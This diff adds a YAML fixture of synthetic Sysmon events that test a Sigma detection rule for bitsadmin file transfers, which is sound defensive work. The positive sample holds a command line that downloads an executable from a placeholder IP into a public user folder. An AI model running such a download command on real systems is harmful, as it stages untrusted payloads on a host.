@@ -1,0 +1,20 @@
+# Positive/negative samples for rules/sigma/win_lolbas_bitsadmin_transfer.yml (synthetic lab events)
+rule: win_lolbas_bitsadmin_transfer.yml
+positive:
+- name: bitsadmin download
+  event:
+    event_id: 1
+    event_source: Microsoft-Windows-Sysmon/Operational
+    details:
+      Image: 'C:\Windows\System32\bitsadmin.exe'
+      CommandLine: 'bitsadmin /transfer job /download /priority high http://203.0.113.8/a.exe C:\Users\Public\a.exe'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+negative:
+- name: Listing BITS jobs
+  event:
+    event_id: 1
+    event_source: Microsoft-Windows-Sysmon/Operational
+    details:
+      Image: 'C:\Windows\System32\bitsadmin.exe'
+      CommandLine: bitsadmin /list /allusers
+      ParentImage: 'C:\Windows\System32\cmd.exe'
